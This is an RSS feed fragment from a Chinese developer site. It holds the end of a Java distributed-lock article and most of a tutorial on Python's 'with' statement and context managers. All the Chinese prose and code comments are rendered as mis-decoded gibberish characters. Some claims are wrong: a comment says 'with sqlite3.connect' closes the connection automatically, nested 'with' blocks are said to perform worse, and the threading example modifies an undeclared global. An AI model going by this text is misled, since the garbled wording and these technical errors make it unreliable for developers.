    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">zookeeperLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä½¿ç”¨Curator</span>
        <span class="hljs-comment">// InterProcessMutex lock = new InterProcessMutex(client, "/locks/myLock");</span>
        <span class="hljs-comment">// lock.acquire();</span>
        <span class="hljs-comment">// try { ... } finally { lock.release(); }</span>
    }
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ3ï¼šåŸºäºæ•°æ®åº“çš„åˆ†å¸ƒå¼é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">databaseLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// SELECT ... FOR UPDATE</span>
        <span class="hljs-comment">// æˆ–ä½¿ç”¨ä¹è§‚é”ï¼ˆç‰ˆæœ¬å·ï¼‰</span>
    }
}
</code></pre>
<p><strong>åˆ†å¸ƒå¼é” vs JVMé”</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ReentrantLock</th><th align="left">åˆ†å¸ƒå¼é”</th></tr></thead><tbody><tr><td align="left">ä½œç”¨èŒƒå›´</td><td align="left">å•JVM</td><td align="left">è·¨JVM/è·¨æœºå™¨</td></tr><tr><td align="left">æ€§èƒ½</td><td align="left">çº³ç§’çº§</td><td align="left">æ¯«ç§’çº§</td></tr><tr><td align="left">å¯é æ€§</td><td align="left">JVMå´©æºƒé”ä¸¢å¤±</td><td align="left">å¯è®¾ç½®è¿‡æœŸæ—¶é—´</td></tr><tr><td align="left">å¤æ‚åº¦</td><td align="left">ç®€å•</td><td align="left">éœ€è¦é¢å¤–ä¸­é—´ä»¶</td></tr><tr><td align="left">å¯é‡å…¥</td><td align="left">æ”¯æŒ</td><td align="left">å–å†³äºå®ç°</td></tr></tbody></table>
<h2 data-id="heading-170">æ€»ç»“</h2>
<p>åˆæ˜¯æ²¡æœ‰å¤§å‚çº¦é¢æ—¥å­ğŸ˜£ğŸ˜£ğŸ˜£ï¼Œå°ç¼–è¿˜åœ¨æ‰¾å®ä¹ çš„è·¯ä¸Šï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘çš„ç¬”è®°æ±‡æ€»æ•´ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†]]></title>    <link>https://juejin.cn/post/7580683234436464703</link>    <guid>https://juejin.cn/post/7580683234436464703</guid>    <pubDate>2025-12-08T03:03:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234436464703" data-draft-id="7580616979473186822" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:03:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withï¼Ÿçœ‹å®Œæˆ‘æ‚Ÿäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:03:31.000Z" title="Mon Dec 08 2025 03:03:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§å´©æºƒçš„æƒ…å†µï¼š</p>
<pre><code class="hljs language-python" lang="python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'data.txt'</span>, <span class="hljs-string">'w'</span>)
f.write(<span class="hljs-string">'é‡è¦æ•°æ®'</span>)
<span class="hljs-comment"># ç¨‹åºåœ¨è¿™é‡Œå´©äº†ï¼Œæ–‡ä»¶æ²¡å…³é—­ï¼</span>
</code></pre>
<p>ç„¶åä½ å‘ç°æ–‡ä»¶æŸåäº†ï¼Œæ•°æ®ä¸¢äº†ï¼Œå®¢æˆ·åœ¨éª‚å¨˜ï¼Œè€æ¿åœ¨çªä½ ...</p>
<p>æ›´ç»çš„æ˜¯è¿™ç§æƒ…å†µï¼š</p>
<pre><code class="hljs language-python" lang="python">conn = sqlite3.connect(<span class="hljs-string">'database.db'</span>)
cursor = conn.cursor()
cursor.execute(<span class="hljs-string">'UPDATE users SET money = money + 1000 WHERE id = 1'</span>)
<span class="hljs-comment"># è¿™é‡ŒæŠ›å¼‚å¸¸äº†ï¼Œè¿æ¥æ²¡å…³é—­ï¼Œæ•°æ®åº“é”æ­»äº†ï¼</span>
</code></pre>
<p>æ•´ä¸ªåº”ç”¨å¡ä½ï¼Œç”¨æˆ·æŠ•è¯‰ç”µè¯è¢«æ‰“çˆ†ï¼Œä½ åœ¨å‡Œæ™¨3ç‚¹é‡å¯æœåŠ¡å™¨...</p>
<p><strong>ä»Šå¤©å’±ä»¬å°±æ¥å½»åº•ææ‡‚Pythonçš„withè¯­å¥ï¼Œè®©ä½ å‘Šåˆ«è¿™äº›èµ„æºæ³„æ¼çš„å™©æ¢¦ã€‚</strong></p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯withè¯­å¥ï¼Ÿ</h2>
<p>ç®€å•æ¥è¯´ï¼Œwithè¯­å¥å°±æ˜¯Pythonçš„"è‡ªåŠ¨ä¿å§†"ã€‚</p>
<p>å®ƒä¼šåœ¨ä½ ä½¿ç”¨èµ„æºçš„æ—¶å€™è‡ªåŠ¨æ‰“å¼€ï¼Œç”¨å®Œäº†è‡ªåŠ¨å…³é—­ï¼Œä¸­é—´å‡ºå¼‚å¸¸äº†ä¹Ÿè‡ªåŠ¨å…³é—­ã€‚</p>
<p>å°±åƒé›‡äº†ä¸ªä¿å§†ï¼Œä½ å‡ºé—¨å‰å‘Šè¯‰ä»–"å¸®æˆ‘ç…§é¡¾å­©å­"ï¼Œä½ å›å®¶æ—¶å­©å­å·²ç»è¢«å“„ç¡ç€äº†ï¼Œä¸ç®¡ä¸­é—´å­©å­æ€ä¹ˆé—¹è…¾ï¼Œä¿å§†éƒ½æå®šäº†ã€‚</p>
<h2 data-id="heading-1">æ²¡ç”¨withçš„æƒ¨ç—›æ•™è®­</h2>
<h3 data-id="heading-2">âŒ æ–°æ‰‹å†™æ³•ï¼ˆæˆ‘å½“å¹´ä¹Ÿè¿™ä¹ˆå†™è¿‡ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
    file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
    <span class="hljs-comment"># å¿˜è®°å…³é—­æ–‡ä»¶äº†ï¼</span>
    <span class="hljs-comment"># æ–‡ä»¶å¥æŸ„æ³„æ¼ï¼Œç³»ç»Ÿèµ„æºè¢«å ç”¨</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> æ–‡ä»¶å¯èƒ½æ²¡ä¿å­˜æˆåŠŸï¼Œå…¶ä»–ç¨‹åºæ— æ³•è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚</p>
<h3 data-id="heading-3">âŒ è¿›é˜¶å†™æ³•ï¼ˆçœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œå®åˆ™å‘çˆ¹ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">try</span>:
        file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
        <span class="hljs-comment"># è¿™é‡Œå¦‚æœæŠ›å¼‚å¸¸ï¼Œfile.close()ä¸ä¼šæ‰§è¡Œï¼</span>
        <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># å‡è®¾è¿™é‡Œå‡ºå¼‚å¸¸äº†</span>
        file.close()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
        <span class="hljs-comment"># æ–‡ä»¶æ²¡å…³é—­ï¼èµ„æºæ³„æ¼ï¼</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> å¼‚å¸¸å¤„ç†äº†ï¼Œä½†èµ„æºæ²¡é‡Šæ”¾ã€‚</p>
<h3 data-id="heading-4">âŒ è€æ‰‹å†™æ³•ï¼ˆç»ˆäºçŸ¥é“è¦closeäº†ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">try</span>:
        file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
    <span class="hljs-keyword">finally</span>:
        file.close()  <span class="hljs-comment"># ä½†æ˜¯å¦‚æœopenå°±å¤±è´¥äº†æ€ä¹ˆåŠï¼Ÿ</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> å¦‚æœ<code>open('important.txt')</code>æœ¬èº«å°±å¤±è´¥ï¼Œ<code>file.close()</code>ä¼šæŠ¥é”™<code>NameError</code>ï¼</p>
<h2 data-id="heading-5">withè¯­å¥çš„æ­£ç¡®å§¿åŠ¿</h2>
<h3 data-id="heading-6">âœ… å¤§ç¥å†™æ³•ï¼ˆä¼˜é›…ã€å®‰å…¨ã€ç®€æ´ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> file:
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
        <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># å°±ç®—è¿™é‡Œå´©äº†ï¼Œæ–‡ä»¶ä¹Ÿä¼šè‡ªåŠ¨å…³é—­</span>
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ï¼ä¸ç®¡ä¸­é—´å‘ç”Ÿä»€ä¹ˆï¼Œæ–‡ä»¶éƒ½ä¼šè¢«æ­£ç¡®å…³é—­ã€‚</p>
<p><strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withçš„åŸå› â€”â€”å®ƒèƒ½è®©ä½ ç¡ä¸ªå®‰ç¨³è§‰ã€‚</strong></p>
<h2 data-id="heading-7">withçš„å·¥ä½œåŸç†</h2>
<p>withè¯­å¥èƒŒåæ˜¯ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼š<code>__enter__</code>å’Œ<code>__exit__</code>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, filename, mode</span>):
        self.filename = filename
        self.mode = mode
        self.file = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‡†å¤‡æ‰“å¼€æ–‡ä»¶...'</span>)
        self.file = <span class="hljs-built_in">open</span>(self.filename, self.mode)
        <span class="hljs-keyword">return</span> self.file  <span class="hljs-comment"># è¿™ä¸ªè¿”å›å€¼ä¼šèµ‹ç»™asåé¢çš„å˜é‡</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‡†å¤‡å…³é—­æ–‡ä»¶...'</span>)
        <span class="hljs-keyword">if</span> self.file:
            self.file.close()

        <span class="hljs-comment"># å¦‚æœè¿”å›Trueï¼Œå¼‚å¸¸ä¼šè¢«å¿½ç•¥</span>
        <span class="hljs-comment"># å¦‚æœè¿”å›Falseæˆ–Noneï¼Œå¼‚å¸¸ä¼šç»§ç»­ä¼ æ’­</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment"># ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-keyword">with</span> FileManager(<span class="hljs-string">'test.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">'Hello World'</span>)
    <span class="hljs-comment"># è¿™é‡Œå°±ç®—æŠ›å¼‚å¸¸ï¼Œ__exit__ä¹Ÿä¼šè¢«è°ƒç”¨</span>
</code></pre>
<p><strong>ä½ å¯ä»¥æŠŠwithæƒ³è±¡æˆä¸€ä¸ªè¶…çº§é è°±çš„ç®¡å®¶ï¼š</strong></p>
<ol>
<li>ä½ è¦è¿›é—¨å‰ï¼Œç®¡å®¶æå‰å¸®ä½ å¼€é—¨ï¼ˆ<code>__enter__</code>ï¼‰</li>
<li>ä½ åœ¨å±‹é‡Œéšä¾¿æŠ˜è…¾ï¼Œç®¡å®¶åœ¨é—¨å£ç­‰ç€</li>
<li>ä½ è¦å‡ºé—¨æ—¶ï¼Œç®¡å®¶å¸®ä½ å…³é—¨ï¼ˆ<code>__exit__</code>ï¼‰</li>
<li>å°±ç®—ä½ åœ¨å±‹é‡Œæ‘”å€’äº†ï¼Œç®¡å®¶ä¹Ÿä¼šå…ˆæ‰¶ä½ èµ·æ¥ï¼Œå†å¸®ä½ å…³é—¨</li>
</ol>
<h2 data-id="heading-8">å®æˆ˜åœºæ™¯ï¼šä»€ä¹ˆæ—¶å€™ç”¨withï¼Ÿ</h2>
<h3 data-id="heading-9">1. æ–‡ä»¶æ“ä½œï¼ˆæœ€å¸¸è§ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯»å–å¤§æ–‡ä»¶ï¼Œä¸ç”¨æ‹…å¿ƒå¿˜è®°å…³é—­</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'big_data.csv'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        process_line(line)  <span class="hljs-comment"># å°±ç®—è¿™é‡Œå†…å­˜æº¢å‡ºï¼Œæ–‡ä»¶ä¹Ÿä¼šå…³é—­</span>
</code></pre>
<h3 data-id="heading-10">2. æ•°æ®åº“è¿æ¥</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_money</span>(<span class="hljs-params">user_id, amount</span>):
    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">'app.db'</span>) <span class="hljs-keyword">as</span> conn:
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">'UPDATE users SET money = money + ? WHERE id = ?'</span>,
                      (amount, user_id))
        <span class="hljs-comment"># è‡ªåŠ¨æäº¤å’Œå…³é—­ï¼Œå°±ç®—è¿™é‡ŒæŠ›å¼‚å¸¸ä¹Ÿä¸ä¼šé”æ­»æ•°æ®åº“</span>
</code></pre>
<h3 data-id="heading-11">3. çº¿ç¨‹é”</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

lock = threading.Lock()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">critical_section</span>():
    <span class="hljs-keyword">with</span> lock:
        <span class="hljs-comment"># ä¸´ç•ŒåŒºä»£ç ï¼ŒåŒæ—¶åªèƒ½ä¸€ä¸ªçº¿ç¨‹è®¿é—®</span>
        shared_resource += <span class="hljs-number">1</span>
        <span class="hljs-comment"># å°±ç®—è¿™é‡ŒæŠ›å¼‚å¸¸ï¼Œé”ä¹Ÿä¼šè¢«é‡Šæ”¾ï¼Œä¸ä¼šæ­»é”</span>
</code></pre>
<h3 data-id="heading-12">4. ç½‘ç»œè¯·æ±‚</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

<span class="hljs-keyword">def</span> <span class="hljs-title function_">download_data</span>():
    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:
        session.auth = (<span class="hljs-string">'user'</span>, <span class="hljs-string">'pass'</span>)
        response = session.get(<span class="hljs-string">'https://api.example.com/data'</span>)
        <span class="hljs-comment"># è¿æ¥æ± è‡ªåŠ¨ç®¡ç†ï¼Œä¸ç”¨æ‹…å¿ƒèµ„æºæ³„æ¼</span>
</code></pre>
<h2 data-id="heading-13">è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨</h2>
<p>æœ‰æ—¶å€™ä½ æƒ³åˆ›å»ºè‡ªå·±çš„"è‡ªåŠ¨ç®¡å®¶"ï¼Œå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">name</span>):
    <span class="hljs-keyword">import</span> time
    start = time.time()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{name}</span> å¼€å§‹æ‰§è¡Œ...'</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># è¿™é‡Œæ˜¯withå—ä¸­çš„ä»£ç </span>
    <span class="hljs-keyword">finally</span>:
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{name}</span> æ‰§è¡Œå®Œæ¯•ï¼Œè€—æ—¶ï¼š<span class="hljs-subst">{end - start:<span class="hljs-number">.2</span>f}</span>ç§’'</span>)

<span class="hljs-comment"># ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-keyword">with</span> timer(<span class="hljs-string">'æ•°æ®å¤„ç†'</span>):
    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
    <span class="hljs-comment"># è¿™é‡Œä¼šè‡ªåŠ¨è®¡ç®—å¹¶æ‰“å°æ‰§è¡Œæ—¶é—´</span>
</code></pre>
<h2 data-id="heading-14">è¸©å‘æŒ‡å—</h2>
<h3 data-id="heading-15">1. __exit__çš„è¿”å›å€¼é™·é˜±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BadContext</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¿›å…¥'</span>)
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'é€€å‡º'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># è¿™è¡Œæ˜¯é™·é˜±ï¼</span>

<span class="hljs-keyword">with</span> BadContext():
    <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># è¿™ä¸ªå¼‚å¸¸ä¼šè¢«"åƒæ‰"ï¼</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç¨‹åºç»§ç»­è¿è¡Œï¼Œä½ éƒ½ä¸çŸ¥é“å‡ºè¿‡å¼‚å¸¸ï¼'</span>)
</code></pre>
<p><strong>åˆ‡è®°ï¼š</strong> é™¤éä½ çœŸçš„çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¦åˆ™<code>__exit__</code>åº”è¯¥è¿”å›<code>False</code>æˆ–<code>None</code>ã€‚</p>
<h3 data-id="heading-16">2. å¼‚å¸¸ä¿¡æ¯ä¸¢å¤±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug_context</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> some_context():
            risky_operation()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># è¿™é‡Œçš„eå¯èƒ½æ˜¯ä¸Šä¸‹æ–‡ç®¡ç†å™¨æŠ›å‡ºçš„å¼‚å¸¸</span>
        <span class="hljs-comment"># è€Œä¸æ˜¯ä½ çœŸæ­£æƒ³æ•è·çš„å¼‚å¸¸</span>
        logger.error(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
</code></pre>
<h3 data-id="heading-17">3. åµŒå¥—withçš„æ€§èƒ½</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ è¿™æ ·å†™æ€§èƒ½ä¸å¥½</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file1.txt'</span>) <span class="hljs-keyword">as</span> f1:
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file2.txt'</span>) <span class="hljs-keyword">as</span> f2:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file3.txt'</span>) <span class="hljs-keyword">as</span> f3:
            process_files(f1, f2, f3)

<span class="hljs-comment"># âœ… æ¨èå†™æ³•</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file1.txt'</span>) <span class="hljs-keyword">as</span> f1, \
     <span class="hljs-built_in">open</span>(<span class="hljs-string">'file2.txt'</span>) <span class="hljs-keyword">as</span> f2, \
     <span class="hljs-built_in">open</span>(<span class="hljs-string">'file3.txt'</span>) <span class="hljs-keyword">as</span> f3:
    process_files(f1, f2, f3)
</code></pre>
<h2 data-id="heading-18">è¿›é˜¶æŠ€å·§</h2>
<h3 data-id="heading-19">1. ä½¿ç”¨contextlib.suppress</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> suppress

<span class="hljs-comment"># æœ‰æ—¶å€™ä½ å°±æ˜¯æƒ³å¿½ç•¥æŸäº›å¼‚å¸¸</span>
<span class="hljs-keyword">with</span> suppress(FileNotFoundError):
    os.remove(<span class="hljs-string">'temp_file.txt'</span>)  <span class="hljs-comment"># æ–‡ä»¶ä¸å­˜åœ¨ä¹Ÿæ²¡å…³ç³»</span>
</code></pre>
<h3 data-id="heading-20">2. ä½¿ç”¨contextlib.nullcontext</h3>
